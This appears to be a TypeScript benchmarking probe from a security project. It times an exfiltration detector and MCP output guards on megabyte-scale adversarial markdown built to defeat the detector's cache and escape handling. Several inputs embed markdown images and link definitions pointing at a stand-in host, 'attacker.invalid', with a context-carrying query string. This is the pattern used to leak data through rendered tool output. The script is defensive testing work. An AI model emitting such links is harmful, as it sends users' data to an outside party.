// T85 — cost of the two repairs, attacked at the mechanism rather than at the
// old shapes.
//
// T84#F-001's repair is a result cache keyed on the `]:` offset. The shape that
// attacks a cache is one whose offsets are all DISTINCT, so nothing is ever a
// hit — `destFailManyDistinctOffsets` and `destFailDistinctGrowingRuns`. The
// argument that they are still linear is that the whitespace runs at distinct
// offsets are pairwise disjoint, so the total is bounded by the input; these
// shapes are that argument's empirical half.
//
// T84#F-003's repair appends two ESCAPE-AWARE candidate ends. The shapes that
// attack it maximise the number of new candidates and the number of opens that
// share one: a run of escaped closes, a run of `![` sharing one escape-aware
// end, a deep nest closed by an escaped bracket, and a document that is nothing
// but backslashes and brackets (which also pays for BUILDING the escape-aware
// structures, since they exist only when the document has a backslash).
//
// Both modes go to a megabyte, which is the size the acceptance bar names.
//
// Usage: bun T85-cost.ts [ladder|boundary]
// Read-only, offline, synthetic and reserved hosts only.
import {
  prepareOutputForPersistence,
  validateOutputForTransport,
  type GuardResult,
} from "../../../../src/security/guard";
import { mergeMcpConfig } from "../../../../src/mcp/config";
import { buildDiscovery } from "../../../../src/mcp/discovery";
import { dispatchCallTool, type McpContext } from "../../../../src/mcp/dispatch";
import { redactToolOutput } from "../../../../src/mcp/redact-seam";
import { detectExfil } from "../../../../src/security/detect/exfil";

const ATT = "attacker.invalid";
const U = `https://${ATT}/p?ctx=CTX`;

const pass: GuardResult = {
  allowed: true,
  decision: { gate: "pass", action: "allow", findings: [] },
};

// Each builder returns a document of about `bytes` bytes.
const shapes: Record<string, (bytes: number) => string> = {
  // --- T84#F-001: shapes that defeat a cache by never repeating an offset ---
  // every `]:` is its own offset, each with its own whitespace run.
  destFailManyDistinctOffsets: (bytes) => {
    const unit = `[a]:${" ".repeat(200)}\n`;
    return unit.repeat(Math.floor((bytes * 0.7) / unit.length)) +
      "[b\n".repeat(Math.floor((bytes * 0.3) / 3));
  },
  // distinct offsets whose runs GROW, so the disjointness claim is the only
  // thing keeping the total linear.
  destFailDistinctGrowingRuns: (bytes) => {
    const parts: string[] = [];
    let used = 0;
    let run = 1;
    while (used < bytes) {
      const unit = `[a]:${" ".repeat(run)}x\n`;
      parts.push(unit);
      used += unit.length;
      run = Math.min(run * 2, 8192);
    }
    return parts.join("");
  },
  // the reviewer's shape, kept for continuity of the table.
  destFailWhitespaceTail: (bytes) =>
    "[a\n".repeat(Math.floor(bytes / 6)) + "]:" + " ".repeat(Math.floor(bytes / 2)),
  // a failing read reached through the ESCAPE-AWARE definition reading, which
  // is the second call site sharing the same cache.
  destFailEscapedLabelTail: (bytes) =>
    "[a\\]b\n".repeat(Math.floor(bytes / 12)) + "]:" + " ".repeat(Math.floor(bytes / 2)),

  // --- T84#F-003: shapes that maximise the new candidate ends --------------
  escapedCloseRun: (bytes) => "![a\\]]".repeat(Math.floor(bytes / 6)),
  // every `![` open shares ONE escape-aware end.
  bangOpenRunEscapedClose: (bytes) => "![".repeat(Math.floor(bytes / 2)) + "\\]]",
  // nothing but backslashes and brackets: pays for building the escape-aware
  // structures with nothing to show for them.
  backslashBracketNoise: (bytes) => "\\[\\]".repeat(Math.floor(bytes / 4)),
  // a deep nest whose real close is escaped, so the escape-aware BALANCED end
  // is the one doing the work.
  nestedEscapedCloses: (bytes) => "![a[b]\\]c]".repeat(Math.floor(bytes / 10)),
  // escaped closes AND a definition, so the label path runs too.
  escapedCloseRunWithDef: (bytes) =>
    "![a\\]]".repeat(Math.floor(bytes / 6)) + `\n\n[a\\]: ${U}\n`,
  // every new candidate end resolves to a real image: the repair's own path,
  // driven at full size.
  escapedAltAllResolving: (bytes) => {
    const unit = `![a\\]](${U})\n`;
    return unit.repeat(Math.floor(bytes / unit.length));
  },
};

const SIZES = [131072, 262144, 524288, 1048576];
const mode = process.argv[2] ?? "ladder";

function best(run: () => void, trials = 3): number {
  let worst = Infinity;
  for (let i = 0; i < trials; i += 1) {
    const started = performance.now();
    run();
    worst = Math.min(worst, performance.now() - started);
  }
  return Number(worst.toFixed(1));
}

if (mode === "ladder") {
  const rows: Array<Record<string, unknown>> = [];
  for (const [shape, build] of Object.entries(shapes)) {
    const points = SIZES.map((target) => {
      const text = build(target);
      return { target, bytes: text.length, ms: best(() => void detectExfil(text, [])) };
    });
    const first = points[0] as { bytes: number; ms: number };
    const last = points[points.length - 1] as { bytes: number; ms: number };
    const exponent =
      Math.log(Math.max(last.ms, 0.05) / Math.max(first.ms, 0.05)) /
      Math.log(last.bytes / first.bytes);
    rows.push({
      shape,
      points,
      exponent: Number(exponent.toFixed(2)),
      worstMs: Math.max(...points.map((p) => p.ms)),
    });
  }
  console.log(
    JSON.stringify(
      {
        probe: "T85-cost/ladder",
        rows,
        overOneSecondAtOrUnderOneMb: rows
          .filter((r) => (r.worstMs as number) > 1000)
          .map((r) => r.shape),
        superLinear: rows.filter((r) => (r.exponent as number) > 1.25).map((r) => r.shape),
      },
      null,
      2,
    ),
  );
} else {
  const cwd = process.cwd();
  const rows: Array<Record<string, unknown>> = [];
  for (const [shape, build] of Object.entries(shapes)) {
    for (const target of [524288, 1048576]) {
      const text = build(target);
      const serialized = JSON.stringify({ note: text });
      const ctx: McpContext = {
        cwd,
        config: mergeMcpConfig({ redactToolOutput: false }),
        discovery: buildDiscovery({ modules: { mcp: { enabled: true } as never } }),
        transport: "in-process",
        tools: [
          {
            name: "p.x",
            module: "standard" as const,
            description: shape,
            inputSchema: { type: "object" },
            mutating: false,
            invoke: async () => ({ note: text }),
          },
        ],
      };
      // BEST OF THREE, the methodology every prior round in this flow used and
      // T83 recorded explicitly ("megabyte-scale timings are noisy on this
      // machine, up to 5x; every table is best-of-three"). A single cold call
      // measures JIT warm-up and GC as much as the detector: the first draft of
      // this probe took one call each and reported 1 120.1 ms for a shape that
      // reads 590.9 ms warm — and reported it as an acceptance failure.
      let mcpBest = Infinity;
      let persistBest = Infinity;
      let transportBest = Infinity;
      let seamBest = Infinity;
      for (let trial = 0; trial < 3; trial += 1) {
        let t = performance.now();
        await dispatchCallTool(ctx, "p.x", {});
        mcpBest = Math.min(mcpBest, performance.now() - t);
        t = performance.now();
        prepareOutputForPersistence(pass, serialized);
        persistBest = Math.min(persistBest, performance.now() - t);
        t = performance.now();
        validateOutputForTransport({ value: { note: text }, format: "json" });
        transportBest = Math.min(transportBest, performance.now() - t);
        t = performance.now();
        await redactToolOutput(cwd, serialized);
        seamBest = Math.min(seamBest, performance.now() - t);
      }
      const mcp = Number(mcpBest.toFixed(1));
      const persist = Number(persistBest.toFixed(1));
      const transport = Number(transportBest.toFixed(1));
      const seam = Number(seamBest.toFixed(1));
      rows.push({
        shape,
        bytes: text.length,
        boundaries: { mcp, persist, transport, seam },
        worstMs: Math.max(mcp, persist, transport, seam),
      });
    }
  }
  const worst = rows.reduce((a, b) =>
    (a.worstMs as number) >= (b.worstMs as number) ? a : b,
  );
  console.log(
    JSON.stringify(
      {
        probe: "T85-cost/boundary",
        rows,
        boundariesOverOneSecond: rows
          .filter((r) => (r.worstMs as number) > 1000)
          .map((r) => `${r.shape}@${r.bytes}`),
        worst,
      },
      null,
      2,
    ),
  );
}
